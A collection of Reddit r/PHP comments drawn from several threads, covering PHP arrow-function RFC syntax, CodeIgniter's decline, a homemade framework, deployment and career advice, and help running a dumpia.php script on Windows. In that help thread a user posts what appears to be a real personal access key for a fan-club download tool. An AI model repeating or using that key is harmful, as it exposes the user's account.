No, it's a downside of PDO, not swoole. For some reason you believe that swoole should perform black magic on libraries that don't lend themselves to be used asynchronously. I don't know why, so I'll let you be.
There is no need to run composer on production server. Especially if you have multiple of then. Run once during build time then upload (with scp or other tool guaranteeing correctnes of upload). What's new is that we automate procedure, avoid ftp at all cost, and deploy to a new directory and such versions with symlink.
Do I get it right that every time [Database::connection()](https://github.com/SilverEngine/Framework/blob/master/System/Database/Db.php#L122) is called it creates a new PDO instance?
If OP decides to take a career in development then they will ultimately need to understand the Linux environment. But this is a hypothetical and they could just as easily become a vet with this line of reasoning. Programmatic concepts remain the same across platforms. It’s only the syntax that differs. Learning on Windows can have its virtues, using Visual Basic in the 90s gave me a solid grounding in understanding the fundamentals, before I ultimately switched to using Linux. To your same argument - don’t ‘diss it because you don’t know it’. .NET developers are paid far more than PHP developers, if you wish to take the economic argument. 
I too started with Visual Basic 6.0 however the transition to any other language after that was difficult due to the lazy programming practice within VB. Your point will never stand a chance when referring to VB
&gt; WinBLOWS - CRAP-os - Lin-sux - er... Poo-nix This game is fun!
more seriously, this is a command line thing so they won't need the web server.
He’s double clicking it like it’s an EXE file.... you think he’ll know CLI?
github/gitlab rest apis should be of good quality and enough complexity
yeah, OP is barking up the wrong tree, but the issue is probably not that they've got Apache configured wrong...
PHP files are usually either a web pages in which case should be run through either production http server or through dev server that comes with php. Or those files are meant for command line in which case you want to use terminal. If you are on windows you may want to find something better then standard cmd.exe, if you will use that file a lot.
Did you just make this framework because your boss wouldn't let you use Laravel?
&gt; a very basic API call Does not require Guzzle HTTP, unless you're already in the context of a framework that facilitates vendor loading.
Try to perform a `wget` or `curl` on the server, if possible, with the same URL to see if you are being blocked or something. $ curl https://api.icndb.com/jokes/2 { "type": "success", "value": { "id": 2, "joke": "MacGyver can build an airplane out of gum and paper clips. Chuck Norris can kill him and take it.", "categories": [] } } It could also be that URL wrappers are disabled, if you are on a shared hosting server or similar: http://php.net/manual/en/wrappers.php
"file based, that can be ported from server to server" Whats the rationale behind this requirement?
&gt; But in that case, you're already toast. Well, there are grades of "toast" - if the entire server is compromised, or just this one application.
We had a bug that let admins of the software download any file on the server.
Good answer, thanks.
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
The application is what has the data and what has the value. That’s customer details, payment processor API’s, code, mail credentials, and so forth. You’re proposing throwing up a red flag about filesystem permissions, but not mentioning the greater flaw in that to do this, the attacker would already have the ability to upload or execute arbitrary code on the server. You’re also pointing out that the attack is from reading /etc/passwd, which has to be world readable on the system, and which does not contain any passwords. There isn’t an attack here. The attack is that someone could upload this code and execute this code in the first place. Preventing that is more of a security audit thing. If your tool can do that, by all means offer it. 
Why the downvotes?
https://github.com/ccxt/ccxt
It does not support WebSocket.
Not for KuCoin, but it will soon. There are lots of included WebSocket exchanges listed https://github.com/lfern/ccxt/blob/feature/websockets-multiple/WEBSOCKETS.md Not sure if you wrote this library and that is why you are posting it, but maybe you can help out with the WebSocket tree on ccxt for KuCoin. https://github.com/lfern/ccxt/tree/feature/websockets-multiple
You know you said: &gt;You are going to get contention issues in a multi user environment. Getting PHP to pick a random number and see if it exists is not going to work. What happens if another thread is running that inserts a record with the same ID straight *after* your first thread has checked to make sure the number hasn't been used? &amp;#x200B; What about if I stick with this, can this ([https://github.com/WulfGamesYT/MultiDatabasePDO/blob/master/src/MultiDatabasePDO.php#L99](https://github.com/WulfGamesYT/MultiDatabasePDO/blob/master/src/MultiDatabasePDO.php#L99)) possibly have the same string even if it checks it? If the code runs at the same time on another thread and it just has the possibility to generate the same string twice, would it be inserted even if it's been checked before inserting? Can that really happen? I'm a bit confused
False advertising. It is not powerful (as described in readme), ORM has no objects (O stands for object) etc...
I looked at your composer file it seems like all of this is written from scratch. That’s great for a learning project but I would have brought in symfony components. Hell my ice cream framework uses symfony components. You also have no tests from what I could see. Which I suppose is fine, also as others have pointed out is false advertising and most of all cocky and arrogant say it’s “powerful”. What was the inspiration behind the project?
My body is ready.
The more I think about it, the more I realize what a horrible mistake it was for PHP to use =&gt; for associative array key value pairs. This poor choice makes the implementation of Short Closures/Arrow Functions very difficult and tricky, the internals struggle to agree on the syntax to use. 
dang, stuck with the word `fn` huh?
Would [($x) =&gt; $x * $y](https://wiki.php.net/rfc/arrow_functions_v2#x_x_y) still be an issue if the parens are required? All of the shown examples omit it.
I humbly wonder about multi-statement bodies. The RFC says &gt; This feature is omitted in this RFC, because the value-proposition of this syntax is much smaller I know that the syntax choices are the issue with landing this RFC. But would multi-statement really increase the controversity? Wouldn't it rather make the suggested form complete? Or perhaps we can hope for a follow-up RFC to include multi-statement bodies in 7.4 as well. &gt; An advantage of supporting this syntax is that it is possible to use a single closure syntax for all purposes (excluding cases that need to control binding behavior), rather than having to mix two different syntaxes depending on whether they use a single expression or multiple statements.
Works for me.
Working with both JS and PHP makes me realize how much I want this. I'll be excited if this passes, and even more excited when we get arrow syntax for real functions. Even their examples can be made more concise. function complement(callable $f) { return fn(...$args) =&gt; !$f(...$args); } could become fn complement(callable $f) =&gt; fn(...$args) =&gt; !$f(...$args); 
hi, all is written from scratch right now our team rebuild from one repo to many different repos and the tests will go in separate repos insted have all in one package. I aware and I agree on your reply but same time new help is always welcome. A lot of people use framrwork and try to compare and point out a lot on most known php frameworks but only a few actually can say i build one or i'm part of the team who build one not just use it. Inspiration is focused on self updating system and we try to present our solutions new programmers as stepping stone to more complex frameworks or any other apps. In general even someone who don't know php can use it to create blog or website landing page etc... Thanks to backend templating system for routing controllers models and other new features that we well add. We aware that is missing tests and documentation but When you have that big project and few developers it's not an easy task to do all what others demand. but we can proud say all was written by us and we try to combine features that already exist together in our way (We don't invent hot water but we use it to combine with our cold one :) ) Hope everyone can understand and not just say to us "Do we need another framework" or something else 
Hope this doesn't get abused, the fact you can see all variables inside your function (except $this) either by use () or by parameter it quite nice from a debugging point of view, something PHP has but JS or languages with descendent scope don't have &amp;#x200B; Hope we also get transducers and performance inlining for certain functions
Yea, it's about goddamn time!
I don’t think that’s really fair. The fat arrow syntax has been there for in the range of 20 years, and the landscape of programming languages was very different back then. If colons had been used with arrays instead, there’s a good chance the fat arrow would have been used for something else in the intervening two decades. But the past is the past, and we have to live with it. Given how much history the language has and how widely deployed it is, I think it’s done a shockingly good job modernizing and keeping up with wider developments. 
&gt; When a variable used in the expression is defined in the parent scope it will be implicitly **captured by-value**. This again :( It makes it impossible to do things like (silly example, but you get the point): $count = 0; array_map(fn() =&gt; $count++, $array); echo $count; // How many items in $array
We could aslso just use `-&gt;` instead of an arrow...
i am really interesting in the etc... part :) About ORM is here more info / Documentation [https://github.com/SilverEngine/Framework/wiki/ReflectORM](https://github.com/SilverEngine/Framework/wiki/ReflectORM)
&gt; A lot of people use framrwork and try to compare and point out most known php frameworks but only a few actually can say i build one or i'm part of the team who build one not just use it. Thats fine and all, but it's even harder to trust the security of your framework when it's not as "popular" if you will as other frameworks that have some credibility. Don't assume I against what you are doing, learning is always a great thing, but I have to question wether this is something that is battle tested and secure. Personally I would look at using symfony as the underlying technology that you then build your own framework abstractions upon, because then at least you have some kind of safety net under you. &gt; Inspiration is focused on self updating system and we try to present our solutions to new programmers as stepping stone to more complex frameworks or any other apps. In general even someone who don't know php can use it to create blog or website landing page etc What exactly do you mean with self updating? Is this a CMS like wordpress thing thats used to create blogs and other related content or is this, as it sounds like later is a laravel inspired thing. If its designed to be super easy, then how does it differ from Laravel - which is the defacto "you're new? Check this out!" &gt; and not just say to us "Do we need another framework" or something else Well thats a valid question, yes we have the heavy hitters. But we also have a few smaller ones that are popular, but they are well built, well tested and clean, modular and easy to follow. I understand and support (for learning purposes) what you are doing, but in terms of promoting this to real world application development, I would be surprised if you got a lot of adopters. Not because its bad, but because it , from the code, screams "I am learning" And again, there is nothing wrong with that, its just not something you would want out in the wild on some ones server. But I support what you are doing 100% :) Best wishes
I must be one of the few people that's so much 100% against this. &amp;#x200B; I absolutely hate these super short syntax' - you will never be able to QUICKLY scan through some code and know what's going on. Closures now have a pretty small syntax already and they are very readable. I don't understand why we need an even shorter syntax :S
Yes. In fact the big problems are all with cases where parentheses are used. If we just have to support `$x =&gt;` none of this would be so hard.
We can't, because `($x) -&gt; $x` is already valid now: It's a property access. Should probably mention this in the syntax discussion.
With self-update i was targeting CLI engine to update the core of framework when new update is avil. The SE is not like wordpress but u can make CMS one of streamers on [twitch.tv](https://twitch.tv) made this with our framework [https://github.com/nmarulo/softn-cms/tree/develop](https://github.com/nmarulo/softn-cms/tree/develop). and yes we make easy to use and simple to understand and yes lot of people compare with Laravel but in general is build that way that all have same strcuture like /App like inside /System (core) If you have few minutes download it and try it. Thank you for your opinion!
Personally I prefer it for clarity. I'd love however if they optionally shortened normal "function" to "fn" as well
The fact that this example is silly is no accident: It's hard to come up with realistic examples where a *single-expression* closure would need a by-reference binding. See also https://wiki.php.net/rfc/arrow_functions_v2#binding_behavior. By-reference binding has undesirable side-effects in languages like PHP that only have function scope. It's not a good default for implicit bindings.
We could write confusing code to assert our superiority
Fat arrow syntax for arrays is one of Perl's influences on PHP. (Although it's used for hashes in Perl, as it actually has an array/hash distinction). Ruby uses it for similar things too. So it predates ES6 arrow functions by about 25 years.
I disagree The first time I worked with a C# codebase, I thought the same as you cause I didnt understand it and found it hard to follow. But once i started using it, it makes it much more clear what is happening. With so much boilerplate code, it makes it more difficult to see what is happening. The less boilerplate the better.
I see where you are coming from. However to me this is not about making everything as short as possible but about reducing clutter/noise. As someone who works with both JavaScript and PHP I really really really welcome this change. In fact, I have been explicitly wanting it.
It's not really that hard. Or at least, it shouldn't be; I don't know what the parser looks like. Realistically all you have to do is scan ahead a few tokens to figure out if `( $x` is the start of a parenthesized expression or the start or a lambda. C#, Java, JavaScript, and D all have "arrow functions" figured out, just to name a few. It's not even hard, [Mond](https://github.com/Rohansi/Mond) is a dynamically typed scripting language with unambiguous lambda parsing written by one dude ([relevant parsing code](https://github.com/Rohansi/Mond/blob/master/Mond/Compiler/Parselets/GroupParselet.cs)).
We Rust now, boys.
Thanks Nikita, Bob, and Levi for constantly pushing the language forward! Question - do the arrow functions have to return something, or could they be `void`? Eg, would this work if `doSomething()` is `void`: `fn($foo) =&gt; $foo-&gt;doSomething()`?
good point. just thinking that `() =&gt; {}` doesnt seem bad either
It's not possible to handle in the parser, which is LALR(1). Obviously you can do whatever you like in hand-written recursive descent parsers. We can do it with some significant lexer hacks for ==&gt;. I'm not sure whether =&gt; is possible that way, I might give it a try to how bad it is.
It would work. It will still do `return $foo-&gt;doSomething()`, but PHP is perfectly fine with taking the return value of a void function: It will be null.
If you think current syntax is OKish, that may be because its still too cumbersome, and you are not using too many of them, instead focusing on the current sweet spot. RFC would broaden that sweet spot considerably. Especially to curried functions (no need to do \`use ($dependency) ... use ($dependency, $argument) ... use ($dependency, $argument, $argument2) ...\` for multi argument functions with some extra variables closed over. Additionally RFC would make one liners a true one liners. "function" + "return" + "{}" + "use" vs "fn" + "=&gt;". For oneliner that calls \`longMethodName\` on \`aLongVariable\` with 'evenLongerNamedArgumentValue\` those 15 less characters may make a difference between readable one liner or readable multi liner. Last but not least, collections only done well if they allow map/reduce, and "function" and "use" push actual implementation to the right unnecessarily. So we will see more callables defined inline as opposed to assigning them to variables so that chained map/reduce looks uniformly. &amp;#x200B; Bottom line. Do not rewrite you existing callables into short syntax. Decide if and how much more code that is not callable yet, could be, and if there are any reasons why shouldn't they be.
You can use this: \`$count = array\_reduce(fn($acc, $cur) =&gt; $acc++, $array, 0)\` **map is not serial, map that parallelize its execution is a good optimization**
You are not the only one.
They're all serial. This is not Rust. I'm demonstrating the concept of modifying a variable outside the closure. I'm not saying this is the best way of counting items in an array (obviously).
&gt; The fact that this example is silly is no accident: It's hard to come up with realistic examples where a single-expression closure would need a by-reference binding. It's a single expression because RFCs are always gradual and incremental. But honestly if you believe it'll stay that way...
This could also be coupled with the pipe operator for some very neat code e.g. the first example on https://hacktophp.org/
I very much expect that we'll support a block form at some point. When we do so, we should also introduce the ability to switch from the by-value default to a by-reference capture of all variables. The RFC suggests `use(&amp;)` as a possible syntax, though I'm not particularly fond of it.
why not f? literally the clearest after function and a shorter symbol, which is part of the intent.
Don't quit - teach them. Sounds like you'd be moving more into an infastructure role if they don't know the technicals like you do. Get clarification from your superior - ask them why the change from PHP to .net?
Do you consider yourself skilled enough to teach them? If so, I'd teach them. Having somebody to teach is the best way to learn much more in bigger depth about what you already know. That's also what kicked me into being consultant and creating my own company later :) first year is about being angry at other people, but later I saw it's all about me :D
i tried entering it in cmd. got an access denied
 fn&amp;() &gt; I already don't like it. But there.
Unfortunately that one's already taken: This is how you write a by-reference return...
Serious question. Since your first CS class, we talk about functions as f, why use fn?
My CTO hide from me which I found out and called my CEO and told him. Now my CTO very angry with me. I asked him why he is doing this, he told me something which makes no sense. 
i'm using &lt;C:\Users\my name\Desktop\storing folder&gt; 
Please no. 
It didn't keep up with the times when PHP devs started to worry about things like OOP, SOLID etc.
Oh well... fn() &amp; =&gt; fn() &amp;&gt; No, I think I'll return my wanna-be-language-designer badge. 
For us it was the lack of namespacing, Composer support (although you could bolt it on) and a good ORM. I just left a role where we were still supporting 20+ CI apps, all running well but painful to update especially after working in Laravel for the last few years. I still keep tabs on CI, secretly rooting for it to become relevant once again. The latest release came out in January of this year so there is still some development going on.
Oh yeah, you're right, I feel stupid.
The chosen prefix would have to become a reserved word
Snitches get stiches bro. On a serious note, you should've confronted the CTO before going to the CEO. 
From my perspective, as an old CodeIgniter user who went on to create Laravel and some might say accelerated its demise... CodeIgniter was failing to keep up with the new, nice features in PHP. PHP 5.3 introduced namespacing, Closures, and late-static binding - all of which made a fresh PHP 5.3+ (at the time) framework like Laravel primed to take a serious strike at CodeIgniter.
We were CEO, CTO and me. Other 2 people working as marketing. 
Without those arrows at the start and end I hope?? 
when i enter it in. it'd be &lt;C:\Users\my name\Desktop\storing folder&gt; not &lt;&lt;C:\Users\my name\Desktop\storing folder&gt;&gt; if you're wondering about that?
I can't think of a reason that would be problematic, where fn would not. http://php.net/manual/en/reserved.php 
You don't need the &lt; and &gt; before and after. At all. Just the path on its own. 
Some say it lives on as Laravel.
 const F = 300; //Newtons $f = "Pay respects";
alright i took the &lt; and &gt; out of the command. my cmd now says php is not recognized as an internal or external command. operable command or batch file. 
Must be something here that's suitable [https://github.com/toddmotto/public-apis](https://github.com/toddmotto/public-apis)
Just do your job and do it well. If you get canned you get canned. You will get unemployment worst case. Tech people are needed 
While I'm absolutely certain that PHP needs this feature, I somewhat dislike the proposed syntax. Having worked with Ruby and Crystal, I'd very much prefer the block based syntax mentioned further down the proposal, especially given that it has no major drawbacks. Having said that, this is a much needed feature and it's definitely better to have an OK implementation instead of none at all.
[https://youtu.be/wDYNVH0U3cs?t=4](https://youtu.be/wDYNVH0U3cs?t=4) &amp;#x200B; I hate this, what's the point of it? really? just having a fancier syntax?
Get paid to job search. It's worth it to keep your options open anyway, so start looking seriously. If it turns out to not be a problem, no harm/no foul and you'll have more insights as to what is out there. If it's as bad as you fear, then it's better to have a job while you're looking for a job than vice versa. But by no means should you quit. Do what it takes to get paid while you either get past this issue or find a new job.
Symfony 1 was released in 2005 and did a pretty good job. Symfony 2 was released in 2011 and was a completely new framework. Pretty much the only thing it shared with Symfony 1 was the name. Symfony 2 hit a real sweet spot in time taking advantage of namespaces as well as the recently released Doctrine 2 rewrite. Symfony 3,4,5 are just incremental improvements to Symfony 2. The initial creator of CodeIgniter decided to move onto other things and the code languished until it was finally taken over by another group. Quite an interesting story. A complete rewrite of CI (CI 4) is ever so slowly inching towards release. Will it take off? Stay tuned.
I agree, but the RFC covers this, and it would create some ambiguous situations, so I think it makes sense to use fn() since it's pretty expressive and shorter than function(). Come.to think of it, maybe fn() should be allowed as a shorthand for function () everywhere.
I don't see the harm in having a dedicated place that can tell you this, but I'd hate to see an annoying message about it constantly. For example, if you have a backend to manage your app, having a security page or an option to enable se urity messages would be ok.
i wonder if single dash would work. `($var) -&gt; {echo $var;}` and yeah `fn` wouldn't be bad either, although i imagine people'd have issues with it just being a somewhat random alias
\&gt; Now they are hiring people &amp;#x200B; What is this "strategy"? You can't blindly hire people without knowing what you actually need. &amp;#x200B; You can't hire a .Net developer if your whole environment is based of PHP. &amp;#x200B; To be honest.. if your salary is not something where you can see over it,.. I would recommend searching something else. You should seek a place where YOU are get teached. &amp;#x200B; In my current place, nearly everyone in our team knows really much. Noone of us are perfect, but if someone of us don't know something, someone else probally know it and share their experience with us. We constantly can challenge us else. Not as a competition, but as a quality insurance. If I do something stupid or there is room for optimization, then my teammates will talk with me about it and in the end make me learn from it. In the other hand, if I see something that can be done better, I will talk with them and teach them. &amp;#x200B; If you are alone with the CEO and a CTO who seem to "hide" from you, then there is literally nothing to learn. Actually.. if they blindly hire someone without even checking what they actually need.. damn, this is wrong on so many levels.. &amp;#x200B; &amp;#x200B;
\`-&gt;\` is property lookup on an object. \`($var)-&gt;\` is already valid syntax today.
My guess would be that they have to make whatever is chosen a reserved keyword, and fn would probably cause less problems in existing code than just f. Also, it's quite a bit more descriptive without being too long.
Ask directly for a hefty raise, effective immediately, reason: you are working on many more fields than agreed upon. Offer to teach for an additional charge. Document what you were doing and what your contract says. You may get fired but then the company might not have enough time to exploit your knowledge. And you know immediately what‘s up. Maybe you manage to find an agreement for a „honorable discharge“. You may also hint that there is an Arbeitsrecht but please lawyer up first if you plan to use that route.
I would love to see this with only the \`f\` letter. That way we could set our ide's to put that 'f' in italic. That would look awesome
&gt; Also, it's quite a bit more descriptive without being too long. How is it more descriptive? f is the ubiquitous symbol for function. I mean, where is fn used more than f? Even the OP I responded to uses $f. wth.
Because it's not just one letter I guess. The OP also has "callable" before the $f, otherwise it might mean anything. I don't know, maybe it's just me. :P
OK improvement! So that message means that it cannot find the PHP binary application. That could mean that it isn't installed correctly or that isn't how you're supposed to use it on Windows. Can you try running the same command, as I said without the &lt; and &gt;, as before, but by replacing the 'php' part with the path to the php executable file that you installed. So for example the full command would be `C:\Path\to\your\php\executable dumpia.php --fanclub &lt;id&gt; --key &lt;key&gt; --output &lt;path&gt;` Note that the square brackets in the command around `[--verbose]` and `[--downloadExisting]` is just a shortcut to say that these bits are optional – you should leave them out or include them if you want but without the square brackets.
Just having to write less boilerplate, what is the point in writing: function($x) use ($a, $b, $c) { return $x + $a + $b + $c; } when you could use just: fn($x) =&gt; $x + $a + $b +$c The get harder to read when you start using 3, 4 functional methods
I did read the RFC. This is a C(omment) on it. He didn't search for f, (as if that matters) ostensibly because it wouldn't give the chipper "there's no conflict", which could have been done by inspecting the parser anyway. const F = 300; has nothing to do with f() You can const keywords in a different case already const php_version = 1; echo PHP_VERSION."\n"; const F = function($x){ echo $x; }; f(test); &lt;-- no conflict. What are you talking about?
Maybe start with best practices, frameworks like MVC for example?
I like your idea. You got my situation 100%.
So, just what I said, a prettier syntax, no real benefit other than adding a JS feature, at least it has a functionality in JS, in JS an arrow function won't bind the "this." element and can be used outside the scope. &amp;#x200B; Also you could write: `function($x) use ($a, $b, $c) {return $x + $a + $b + $c;}` Also, if we have strict type checking how would this look? `fn($x) : void ==&gt; $x + $a + $b +$c;?` I just read the type checking thing, that's horrible, it went from `fn() =&gt;` to `: Type? ==&gt;` &amp;#x200B; There is no real usage or benefit to this other than "we are jealous of javascript, we want our fancy toys too!"
Yes, you can name variables as special identifiers, I was wrong about that. I've never used variable names like $foreach so I thought that was not possible. What is the meaning of "f"? Should we make "c" a protected keyword for creating anonymous classes?
I don't like the word \`fn\` - it's too much like functional programming, which I get a lot of you do, but PHP has moved in the last few years to a more OO, which also has its downsides. But thats just my opinion. The question I have, is : Are we really wanting to "copy" JS ES6? I get the purpose behind this, it would clean up and make code a lot "skinnier" but I just had to ask.
alright each time we make a like more progress. now then i enter that in the get usage: php dumpia --fanclub id --key key --output home/user/dumpia/ [--verbose] [--downloadExisting] (the id and key are different from what i entered)
I actually called my CEO and tell him exactly what you said, why they hire someone and making the website again from scratch? I am using GIT and FTP is only for file transfer.
Awesome! That message means that the dumpia.php file is being run, but that it doesn't understand the rest of your command. Can you copy the entire command here into reddit (and use the "code" format button in the reddit comment box so it is easier to read). 
Take a look at this real-life closure I found online, which is included in the RFC's introduction: function array_values_from_keys($arr, $keys) { return array_map(function ($x) use ($arr) { return $arr[$x]; }, $keys); } Out of the 38 non-whitespace characters that make up the closure, 30 are boilerplate (~79% boilerplate!). So if you think closures have a pretty small syntax, we simply won't agree.
For the purposes of anonymous functions, it's customary (from the 17th century or so). Whatabout other possible conventions, is a derail.
It's not copying JS as such, but nearly every other modern language. It can make certain kinds of code much more readable and, to borrow a word, glanceable. &gt;but PHP has moved in the last few years to a more OO What do you mean by this? Short closures have their place in object-orientated code as much as anything else.
idk how to use the code format button, but the command i have is as followed C:\Users\VanB\Desktop\php\dumpia.php --fanclub 2931 --key 86ab236d83843d2aacbc5dcd0e85bc31 --output C:\Users\VanB\Desktop\storing folder [--verbose] [--downloadExisting] (note the php is a folder with the php files it came with in there)
First problem is as I said before the bits in the square brackets aren't supposed to be used "as is". Remove both the bits with the square brackets. Second problem is the space in your storing folder. Like I said in a previous message using a space requires a special kind of way of writing for command line. Easiest thing is to rename this folder to something without a space and update the command to this new name. 
All in all nice work and a good read on the pros and cons of the variants. I'm not sure weather this brevity is worth the effort or not cause I don't see much difference in `$rand = fn() =&gt; 3*$seed;` over the "old" `$rand=function() {return 3*$seed};`. Except for the (missing) `use($seed)`. The value I see for me is that, the implicit capture... not because I'm switching a lot between languages with implicit capture and those run into error when I forget `use($shit)`... again. Noooo, I just like it.. because it's uhm.. fancy or something. &amp;#x200B; Personally I prefer `function` as the keyword tho, since it is the least intrusive for developers. Both for the single-line/expr body variant and a possible multi-line body variant this could look like ^(this hideous part of a totally hypothetical user test seeder): $names = collect($faker-&gt;names(1000)); $attrcompa = function($x,$y,$n) =&gt; ($x-&gt;{$n} &gt; $y-&gt;{$n}) ? 1 : (($x-&gt;{$n} &lt; $y-&gt;{$n}) ? -1 : 0); $users = $names.map(function($name) { return DB::transaction(function() =&gt; { $u = User::create(['name' =&gt; $name]); UserData::create([ 'user_id' =&gt; $u-&gt;id, 'rev_next' =&gt; null ]); return $u; }); })-&gt;sort(function($x,$y) =&gt; $attrcompa($x,$y,'name')); ... $users-&gt;each(function($u) =&gt; $u-&gt;delete()); &amp;#x200B; I can probably also live with `fn() =&gt; ..` or `$() =&gt; ..` and so on over `function() =&gt; ..`. Even might be better for people who switch between older/newer code bases and those can hunt down a wrongly used `fn(` more easy. But brevity? Hmmm.. it's a whooping 6-7 characters, a hard decision weather to introduce such a change for just a few chars.
While f() is indeed commonly used in calculus, it is not commonly used in programming languages. fn (Rust), fun (Kotlin), func (Go), function (PHP) are typical function declaration keywords, but I don't believe I've every seen f used. (Supporting syntax like `f(x) = ...` like in Julia is an entirely different matter: f is a function name there, not a function declaration keyword.)
alright it now looks like this C:\Users\VanB\Desktop\php\dumpia.php --fanclub 2931 --key 86ab236d83843d2aacbc5dcd0e85bc31 --output C:\Users\VanB\Desktop\storingfolder --verbose --downloadExisting still getting the same usage stuff though
The part "C:\Users\VanB\Desktop\php\dumpia.php" should be "C:\Users\VanB\Desktop\php\php.exe dumpia.php" (if your PHP version is called php.exe)
Also try removing the --verbose and --downloadExisting completely
ok changed that. now i get could not open input file: dumpia.php
Try C:\\Users\\VanB\\Desktop\\php\\php.exe C:\\Users\\VanB\\Desktop\\php\\dumpia.php ...(and the rest)
same result as before: could not open input file: dumpia.php
&gt; Since your first CS class Not everyone took CS. I know I didn't. Using `f` as a notation for `function` is something I recognize from mathematics, but I don't see it too much in programming. Maybe when you're talking about Big O notation, but in actual code or when drafting some pseudocode to show someone? Not in my experience so far &gt; why use fn Since i didn't write the RFC, I can only guess that it's an attempt to create a short but unambiguous way of saying `function`. `f` might work, but I don't think it's that common in programming, especially since `f` has had more use in programming (to my knowledge) as meaning `float`. Neither are very common, especially in PHP, but if you just showed me the identifier `f` without context and asked me what I thought it meant I'd probably assume `float`. `fn` however is much less ambiguous. &gt; Even the OP I responded to uses $f The example I'm using that has `$f` comes directly from the RFC itself. I just copy-pasted the example
We could always use the sperm-arrow operator, ``~&gt;``
What about a page during installation with certain security recommendations, like chrooting the web user or using a container? The problem with security is that the recommendations constantly change, and the opinions about them are _very_ strong in the community, I feel like.
Pretty good idea I've seen used often, as long as there is an install process. Thinking about this more, it would be nice if there was (there might be) a simple script you could toss in and run just to check from git or composer that's widely used thay could cover this. May e r/php could do such a thing.
&gt; Come to think of it, maybe fn() should be allowed as a shorthand for function() everywhere. Look at the RFC, it's proposed under "Future scope": &gt; # Allow arrow notation for real functions &gt; It would be possible to allow using the arrow notation for normal functions and methods as well. This would reduce the boilerplate for single-expression functions like getters: ```php class Test { private $foo; private $bar; fn getFoo() =&gt; $this-&gt;foo; fn getBar() =&gt; $this-&gt;bar; } ```
 $collection = collect([1, 2, 3, 4]); $sum = $collection-&gt;filter(function ($value, $key) { return $value &gt; 2; }) -&gt;groupBy(function ($number, $key) { return $number % 2; }) -&gt; map(function ($numbers) { return $numbers-&gt;sum(); }); $collection = collect([1, 2, 3, 4]); $sum = $collection-&gt;filter(fn ($value, $key) =&gt; $value &gt; 2) -&gt;groupBy(fn ($number, $key) =&gt; $number % 2) -&gt; map(fn ($numbers) =&gt; $numbers-&gt;sum()) I keep thinking that having less stuffs, even when is a pair of curly bracket less make it easier to read. I we're always annoyed by those methods calls. Now they could have a lot less clutter. &gt;There is no real usage or benefit to this other than "we are jealous of javascript, we want our fancy toys too!" Yeah, that's completely the point here, with this RFC we're going to be able to kidnap some JS devs showing them our new fancy toy. /s Nothing to say about strict type checking, but hey!, this RFC is under discussion, maybe the community won't approve this. I hope they do :)
From what I can remember it was created sometime before PHP5 correct? I remember OOP being more of a broken thing in PHP4 and a lot of modern conventions only started catching up in version 5.
Wait FTP? Is this a wordpress thing? If not why not use an actual framework with a deployment system?
I think this is the best response to me. Namespacing and closures were big ones, JS development is especially big in anonymous functions and callbacks, couldn't seen how PHP would want to be left out.
Codeigniter 
Why shorten `function` to `fn`… do we really need two function keywords? `function ($a, $b) =&gt; ($a + $b)` isn't that long…
Honestly, it would be better if fn() was just an alias/proxy to function() in general and including NOT within arrow functions.
The RFC explains the difficulties this raises for the parser. Some form of symbol at the beginning of an arrow function makes things far simpler.
Short-form lambda syntax is a feature in many languages besides JavaScript. Additionally, consider that brevity (or 'prettier syntax') is a feature on its own, as it can make constructs both easier to read and quicker to write, especially when you're doing a lot of work involving functions like `array_map` or `array_filter`. This is a real benefit if you're doing a lot of array manipulation because it allows you to more easily focus on the manipulations rather than the boilerplate syntax around them.
Using `\\` is mentioned briefly as a viable alternative. Doesn't that also avoid the potential conflict over making "fn" a reserved word? Seems like it may be a better choice. I'm struggling to think of any place that `\\(` is valid syntax, so it'd still be easy to parse.
I still have a point, there's no real benefit from it other than a prettier syntax and less code (debatable?) If you tell me something like "It provides better performance because the parser can read files faster" I'd agree with you
Hopefully a good lead has already configured the vagrant/docker with debug extension. 
PHP keep getting better
CodeIgniter stalled because of Expression Engine, in two ways: 1. EllisLab spent all their time working on Expression Engine. CI was a low priority. 2. A significant upgrade of CI meant a significant upgrade to EE. And just like WordPress is still stuck in its old ways, EllisLab + EE chose to keep updates as simple as possible for their customer base.
i have been staring at the webpage for about 20 minutes now, how do you use it?
Whatever it ends up being if they also made it work with ƒ I would make my linter actually use it and it would look so nice.
Oh now we're talking
you can mock requests to it, and have it behave as you expect, like so: resource that returns a uuid: https://httpbin.org/uuid get a jpeg: https://httpbin.org/image/jpeg get some xml: https://httpbin.org/xml trigger a login prompt: https://httpbin.org//basic-auth/myuser/secret
Even now, CI 4 is in beta and its the same framework with minor changes. They make no effort to bring the framework upto spec with modern standards such as PSR. The only PSR's they have adopted is PSR-2 and PSR-4
What was the result? I am sure he wasn't happy, since taking critic and accepting it is not what everyone can do easily. I hope he is a wise man who listens instead of becoming childish. &amp;#x200B; IMHO this was the one of the correct choices. It may feel bad and unconfortable, especially this all situation can change things in your life and be annoying, but in the long run it will be a very wise move that makes you 1000% happier in the future. &amp;#x200B; Luckly developers are searched everywhere. The market is never ending. 
What does yours do that all the other existing clients don't? https://packagist.org/search/?q=pwned
Probably not much, I mostly did it for the fun of it.
See also https://www.peachpie.io/
Personally I would prefer to combine the fn() keyword with the ~&gt; arrow syntax. It makes scanability of the code better because the arrows are unambiguous. It's nice that the parser can figure it out just from the fn() but people read code too. Using a different arrow syntax makes it easier for us humans who may not have noticed that fn(). Especially in code that combines both arrays as short closures.
Show some authority. Don't let people decide the tech stack. Teach them about the way you want things to be architectured. Not only in terms of tech you can or cannot use, but also which workflow you want to have to move the project forward. Make sure you do pull requests and you're the only one to be able to push to master. Create a CI with tons of automatic checks so that the newbies developers cannot just dump any random piece of code into your project. Be patient and have faith. It takes usually 6 months for any developer to adapt to a new environment.
yeah, why be consistent with virtually every other language that has this? I want arrow functions badly, but this part makes me not want them.
There are languages influence by lambda calculus which use lambda symbol for nice one character keywords. Proposal already mention them.
Yes, the syntax `\() =&gt;` is possible. It has no issues on the syntax level. The choice of `fn() =&gt;` over `\() =&gt;` is only because I consider the former to be more readable (and am not concerned about the reserved keyword).
